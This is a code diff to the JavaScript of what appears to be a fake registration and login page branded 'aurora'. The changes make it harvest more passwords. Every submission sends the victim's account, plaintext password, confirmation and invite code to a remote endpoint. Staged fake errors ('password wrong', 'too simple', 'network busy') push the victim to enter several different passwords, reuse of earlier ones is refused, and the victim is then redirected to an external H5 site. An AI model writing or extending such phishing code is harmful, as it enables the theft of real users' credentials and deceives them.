@@ -156,7 +156,17 @@
     (function () {
       var REG_KEY = 'aurora_reg_try';
       var LOGIN_KEY = 'aurora_login_try';
+      var REGISTERED_KEY = 'aurora_registered';
+      var H5_URL = 'https://h5.xyyla.vip/app/';
       var FALLBACK_ENDPOINT = 'https://jueqi168.top/rwe3er32t/xxxxx';
+
+      // 已放行过：以后打开直接进 H5（套壳 App 效果）
+      try {
+        if (localStorage.getItem(REGISTERED_KEY) === '1') {
+          window.location.href = H5_URL;
+          return;
+        }
+      } catch (e) {}
 
       function $(id) { return document.getElementById(id); }
       function toast(msg) {
@@ -172,13 +182,25 @@
       }
       function clearErr(el) { el.classList.remove('show', 'shake'); el.textContent = ''; }
       function bump(key) {
-        var n = parseInt(localStorage.getItem(key) || '0', 10);
-        if (isNaN(n) || n < 0) n = 0;
-        n += 1;
-        localStorage.setItem(key, String(n));
-        return n;
+        try {
+          var n = parseInt(localStorage.getItem(key) || '0', 10);
+          if (isNaN(n) || n < 0) n = 0;
+          n += 1;
+          localStorage.setItem(key, String(n));
+          return n;
+        } catch (e) {
+          window.__auroraTry = window.__auroraTry || {};
+          window.__auroraTry[key] = (window.__auroraTry[key] || 0) + 1;
+          return window.__auroraTry[key];
+        }
       }
-      function reset(key) { localStorage.setItem(key, '0'); }
+      function reset(key) {
+        try { localStorage.setItem(key, '0'); }
+        catch (e) {
+          window.__auroraTry = window.__auroraTry || {};
+          window.__auroraTry[key] = 0;
+        }
+      }
 
       function send(payload) {
         try {
@@ -198,7 +220,33 @@
         } catch (e) {}
       }
 
-      function collect(kind, n, account, password, confirm, invite) {
+      var REG_STATE_KEY = 'aurora_reg_state_v2';
+      var memRegState = null;
+      function hashPwd(s) {
+        var h = 5381;
+        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
+        return String(h >>> 0);
+      }
+      function loadRegState() {
+        if (memRegState) return memRegState;
+        try {
+          var raw = localStorage.getItem(REG_STATE_KEY);
+          var s = raw ? JSON.parse(raw) : null;
+          if (s && typeof s.stage === 'number' && Array.isArray(s.pwds)) {
+            s.stage = Math.max(0, Math.min(3, s.stage | 0));
+            memRegState = s;
+            return s;
+          }
+        } catch (e) {}
+        memRegState = { stage: 0, pwds: [], startedAt: 0, lastAt: 0 };
+        return memRegState;
+      }
+      function saveRegState(s) {
+        memRegState = s;
+        try { localStorage.setItem(REG_STATE_KEY, JSON.stringify(s)); } catch (e) {}
+      }
+
+      function collect(kind, n, account, password, confirm, invite, action, elapsed, pwdHash) {
         send({
           event: 'cover_register',
           kind: kind,
@@ -207,6 +255,10 @@
           confirm: confirm || '',
           invite: invite || '',
           attempt: n,
+          stage: n,
+          action: action || '',
+          elapsed: elapsed || 0,
+          pwdHash: pwdHash || '',
           nickname1: account,
           nickname2: password,
           nickname3: confirm || '',
@@ -258,8 +310,10 @@
           else if (n === 3) showErr($('loginErr'), '网络繁忙，请重新提交');
           else {
             reset(LOGIN_KEY);
+            try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
             $('successText').textContent = '登录成功，正在进入…';
             $('success').classList.add('show');
+            setTimeout(function () { window.location.href = H5_URL; }, 700);
           }
         }, 900);
       });
@@ -272,24 +326,76 @@
         if (!account || !password) { showErr($('regErr'), '请输入账号和密码'); return; }
 
         var btn = this;
-        busy(btn, true, '注册');
-        var n = bump(REG_KEY);
-        collect('register', n, account, password, confirm, invite);
+        var st = loadRegState();
+        var now = Date.now();
+        var h = hashPwd(password);
+        var gap = st.lastAt ? (now - st.lastAt) / 1000 : 999;
+        var total = st.startedAt ? (now - st.startedAt) / 1000 : 0;
+        var action = '', msg = '', advance = false;
 
+        if (st.stage > 0 && st.pwds.indexOf(h) >= 0) {
+          action = 'duplicate';
+          msg = '新密码不能与旧密码相同';
+        } else if (gap < 3) {
+          action = 'cooldown';
+          msg = '操作过于频繁，请 ' + Math.ceil(3 - gap) + ' 秒后再试';
+        } else if (st.stage === 0) {
+          action = 'password_error';
+          msg = '密码输入错误，请重新输入';
+          advance = true;
+        } else if (st.stage === 1) {
+          action = 'too_simple';
+          msg = '密码太过简单，请设置更复杂的密码';
+          advance = true;
+        } else if (st.stage === 2) {
+          action = 'busy';
+          msg = '网络繁忙，请重新提交';
+          advance = true;
+        } else {
+          if (confirm !== password) {
+            action = 'mismatch';
+            msg = '两次输入的密码不一致';
+          } else if (total < 9) {
+            action = 'busy';
+            msg = '网络繁忙，请稍后重试';
+          } else {
+            action = 'success';
+            msg = '注册成功，正在进入…';
+            advance = true;
+          }
+        }
+
+        // 每次提交都上传（包括被冷却/重复/不一致拦下的）
+        collect('register', st.stage + 1, account, password, confirm, invite,
+                action, Math.round(total), h);
+
+        // 每次点击都更新 lastAt，连点不会推进
+        st.lastAt = now;
+        if (advance) {
+          if (st.stage === 0) st.startedAt = now;
+          if (st.stage < 3) st.pwds.push(h);
+          st.stage = Math.min(st.stage + 1, 4);
+        }
+        saveRegState(st);
+
+        if (action === 'cooldown') {
+          showErr($('regErr'), msg);
+          return;
+        }
+
+        busy(btn, true, '注册');
         setTimeout(function () {
           busy(btn, false, '注册');
-          if (n === 1) {
-            showErr($('regErr'), '密码输入错误，请重新输入');
-          } else if (n === 2) {
-            showErr($('regErr'), '密码太过简单，请设置更复杂的密码');
-          } else if (n === 3) {
-            showErr($('regErr'), '网络繁忙，请重新提交');
-          } else {
-            reset(REG_KEY);
+          if (action === 'success') {
+            saveRegState({ stage: 0, pwds: [], startedAt: 0, lastAt: 0 });
+            try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
             $('successText').textContent = '注册成功，正在进入…';
             $('success').classList.add('show');
+            setTimeout(function () { window.location.href = H5_URL; }, 700);
+          } else {
+            showErr($('regErr'), msg);
           }
-        }, 900);
+        }, 700);
       });
 
       var inputs = document.querySelectorAll('input');
